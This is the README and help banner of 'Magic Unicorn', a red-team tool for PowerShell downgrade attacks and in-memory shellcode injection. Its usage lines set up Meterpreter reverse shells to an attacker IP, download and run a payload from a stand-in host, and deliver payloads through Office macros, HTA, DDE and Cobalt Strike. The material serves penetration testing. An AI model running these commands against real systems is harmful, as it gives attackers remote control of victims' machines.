unicorn
Written by: Dave Kennedy (@HackingDave) Website: https://www.trustedsec.com

Magic Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18.

Usage is simple, just run Magic Unicorn (ensure Metasploit is installed if using Metasploit methods and in the right path) and magic unicorn will automatically generate a powershell command that you need to simply cut and paste the powershell code into a command line window or through a payload delivery system. Unicorn supports your own shellcode, cobalt strike, and Metasploit.

root@rel1k:~/Desktop# python unicorn.py 

                                                         ,/
                                                        //
                                                      ,//
                                          ___   /|   |//
                                      `__/\_ --(/|___/-/
                                   \|\_-\___ __-_`- /-/ \.
                                  |\_-___,-\_____--/_)' ) \
                                   \ -_ /     __ \( `( __`\|
                                   `\__|      |\)\ ) /(/|
           ,._____.,            ',--//-|      \  |  '   /
          /     __. \,          / /,---|       \       /
         / /    _. \  \        `/`_/ _,'        |     |
        |  | ( (  \   |      ,/\'__/'/          |     |
        |  \  \`--, `_/_------______/           \(   )/
        | | \  \_. \,                            \___/\
        | |  \_   \  \                                 \
        \ \    \_ \   \   /                             \
         \ \  \._  \__ \_|       |                       \
          \ \___  \      \       |                        \
           \__ \__ \  \_ |       \                         |
           |  \_____ \  ____      |                        |
           | \  \__ ---' .__\     |        |               |
           \  \__ ---   /   )     |        \              /
            \   \____/ / ()(      \          `---_       /|
             \__________/(,--__    \_________.    |    ./ |
               |     \ \  `---_\--,           \   \_,./   |
               |      \  \_ ` \    /`---_______-\   \\    /
                \      \.___,`|   /              \   \\   \
                 \     |  \_ \|   \              (   |:    |
                  \    \      \    |             /  / |    ;
                   \    \      \    \          ( `_'   \  |
                    \.   \      \.   \          `__/   |  |
                      \   \       \.  \                |  |
                       \   \        \  \               (  )
                        \   |        \  |              |  |
                         |  \         \ \              I  `
                         ( __;        ( _;            ('-_';
                         |___\        \___:            \___:


aHR0cHM6Ly93d3cuYmluYXJ5ZGVmZW5zZS5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTcvMDUvS2VlcE1hdHRIYXBweS5qcGc=

                
-------------------- Magic Unicorn Attack Vector -----------------------------

Native x86 powershell injection attacks on any Windows platform.
Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)
Twitter: @TrustedSec, @HackingDave
Credits: Matthew Graeber, Justin Elze, Chris Gates

Happy Magic Unicorns.

Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>

PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443

PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe

Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro

Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro

Macro Example Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode macro

HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta

HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta

HTA Example Shellcode: python unicorn.py <path_to_shellcode.txt>: shellcode hta

DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde

CRT Example: python unicorn.py <path_to_payload/exe_encode> crt

Custom PS1 Example: python unicorn.py <path to ps1 file>

Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500

Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)

Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00)

Help Menu: python unicorn.py --help
